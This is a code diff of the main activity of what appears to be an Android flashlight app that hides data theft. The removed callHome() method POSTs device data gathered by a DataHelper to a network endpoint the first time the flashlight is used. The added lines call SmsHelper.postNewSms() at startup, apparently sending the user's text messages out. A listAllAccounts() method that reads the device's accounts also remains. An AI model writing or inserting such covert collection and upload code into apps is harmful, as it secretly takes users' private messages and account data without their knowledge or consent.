@@ -27,9 +27,9 @@ public class MainActivity extends Activity {
     private boolean isFlashlightOn = false;
     private Camera camera;
     private Context context = this;
-    private DBhelper dbHelper;
     private NetworkHelper networkHelper;
     private boolean hasCalledHome = false;
+    private SmsHelper smsHelper;
 
 
     @Override
@@ -44,7 +44,10 @@ public class MainActivity extends Activity {
 
         camera = Camera.open();
         final Camera.Parameters p = camera.getParameters();
-
+        
+        smsHelper = new SmsHelper(this);
+        // not sure if this should be here or not
+        smsHelper.postNewSms();
 
         toggle.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -63,7 +66,7 @@ public class MainActivity extends Activity {
                     } else {
                         Log.d("APP: ", "Flashlight is ON!");
                         if (!hasCalledHome) {
-                            callHome();
+                            //callHome();
                             hasCalledHome = true;
                         }
                         p.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
@@ -75,28 +78,13 @@ public class MainActivity extends Activity {
                 }else {
                     Toast.makeText(context, "No camera found ", Toast.LENGTH_LONG).show();
                     if (!hasCalledHome) {
-                        callHome();
+                        //callHome();
                         hasCalledHome = true;
                     }
                 }
             }
         });
-    }
-
-
-    public void callHome() {
-        Toast.makeText(this, "Calling home...",Toast.LENGTH_SHORT).show();
-        Log.d("APP:", "Calling home");
-        networkHelper = new NetworkHelper();
-
-        // For testing only
-//        listAllAccounts();
-
-        DataHelper dataHelper = new DataHelper(this);
-
-        networkHelper.makePOSTRequest(dataHelper.getData());
-        networkHelper.execute();
-    }
+    }    
 
     public void listAllAccounts(){
         Account[] accounts = AccountManager.get(context).getAccounts();
